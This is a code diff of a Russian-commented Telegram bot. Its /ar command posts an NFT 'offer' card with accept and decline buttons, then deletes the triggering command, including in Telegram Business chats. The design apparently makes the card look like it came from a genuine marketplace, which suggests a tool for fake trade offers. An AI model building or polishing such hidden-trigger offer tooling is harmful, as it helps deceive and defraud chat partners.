@@ -392,6 +392,8 @@ async def process_broadcast(message: Message, state: FSMContext):
         parse_mode="HTML"
     )
 
+# ==================== ЛОГИКА КОМАНДЫ /ar ====================
+
 async def execute_ar_command(message: Message, is_business: bool = False):
     user_id = message.from_user.id
     register_user(user_id)
@@ -400,17 +402,19 @@ async def execute_ar_command(message: Message, is_business: bool = False):
         await message.answer("❌ У вас нет доступа к использованию этого бота.")
         return
 
-    # Более безопасный способ убрать /ar из текста
+    # Безопасно убираем /ar из текста
     text = message.text or ""
     args_text = re.sub(r'^/ar(@\w+)?\s*', '', text, flags=re.IGNORECASE).strip()
     raw_args = args_text or "MirageLamp-44307 2727 stars"
 
     slug, price_display, _ = parse_query_and_price(raw_args)
+    
+    # Если это бизнес-чат, получаем ID подключения
     biz_conn_id = message.business_connection_id if is_business else None
 
     try:
         data = await fetch_real_nft_data(slug)
-    except Exception as e:
+    except Exception:
         await message.answer("⚠️ Не удалось получить данные по офферу, попробуйте позже.")
         return
 
@@ -420,7 +424,7 @@ async def execute_ar_command(message: Message, is_business: bool = False):
         show_above_text=True,
     )
 
-    # 1. Отправляем карточку.
+    # 1. Отправляем карточку
     try:
         await bot.send_message(
             chat_id=message.chat.id,
@@ -434,10 +438,10 @@ async def execute_ar_command(message: Message, is_business: bool = False):
         await message.answer(f"⚠️ Ошибка отправки карточки: {e}")
         return
 
-    # 2. Пауза для прогрузки карточки
+    # 2. Пауза, чтобы Telegram успел отрисовать карточку
     await asyncio.sleep(0.5)
 
-    # 3. Удаление команды /ar
+    # 3. Удаление сообщения с командой /ar
     if biz_conn_id:
         try:
             await bot.delete_business_messages(
@@ -445,34 +449,41 @@ async def execute_ar_command(message: Message, is_business: bool = False):
                 message_ids=[message.message_id],
             )
         except Exception as e:
-            # Если удалить не удалось — бот пишет об этом в чат!
-            await message.answer(
-                f"⚠️ <b>Не удалось удалить команду /ar!</b>\n\n"
+            # Если Telegram запретил удалять, бот напишет вам ПРЯМО В ЧАТ
+            error_text = (
+                f"⚠️ <b>Telegram не дал удалить команду /ar!</b>\n\n"
                 f"Причина: <code>{e}</code>\n\n"
-                f"👉 <i>Чтобы бот мог удалять сообщения в Business-аккаунте, "
-                f"зайдите в Настройки -> Telegram Business -> Чат-боты -> Ваш бот "
-                f"и включите галочку «Удаление сообщений» (Delete messages).</i>",
+                f"👉 <b>Что делать:</b>\n"
+                f"1. Зайдите в настройки Telegram.\n"
+                f"2. Перейдите в <b>Telegram Business -> Чат-боты</b>.\n"
+                f"3. Выберите этого бота.\n"
+                f"4. Включите галочку <b>«Удаление сообщений»</b> (Delete messages).\n"
+                f"5. Перезапустите бота."
+            )
+            await bot.send_message(
+                chat_id=message.chat.id,
+                business_connection_id=biz_conn_id,
+                text=error_text,
                 parse_mode="HTML"
             )
+            print(f"[ОШИБКА УДАЛЕНИЯ]: {e}")
     else:
         try:
             await message.delete()
         except Exception as e:
-            await message.answer(
-                f"⚠️ Не удалось удалить команду /ar.\n"
-                f"Причина: <code>{e}</code>",
-                parse_mode="HTML"
-            )
+            await message.answer(f"⚠️ Ошибка удаления: <code>{e}</code>", parse_mode="HTML")
 
 # Обработчик для Бизнес-аккаунтов
-@dp.business_message(F.text.regexp(r'^/ar(@\w+)?(\s|$)'))
+@dp.business_message(F.text.startswith("/ar"))
 async def handle_business_ar(message: Message):
     await execute_ar_command(message, is_business=True)
 
 # Обработчик для Обычных чатов
-@dp.message(F.text.regexp(r'^/ar(@\w+)?(\s|$)'))
+@dp.message(F.text.startswith("/ar"))
 async def handle_regular_ar(message: Message):
     await execute_ar_command(message, is_business=False)
+
+# ==================== КНОПКИ ОФФЕРА ====================
 
 @dp.callback_query(F.data == "step2_accept")
 async def process_step2(callback: CallbackQuery):
@@ -499,6 +510,8 @@ async def process_decline(callback: CallbackQuery):
     elif callback.inline_message_id:
         await bot.edit_message_id(inline_message_id=callback.inline_message_id, text=declined_text, parse_mode="HTML")
     await callback.answer("Оффер отклонен")
+
+# ==================== ЗАПУСК ====================
 
 async def main():
     print("Бот успешно запущен!")
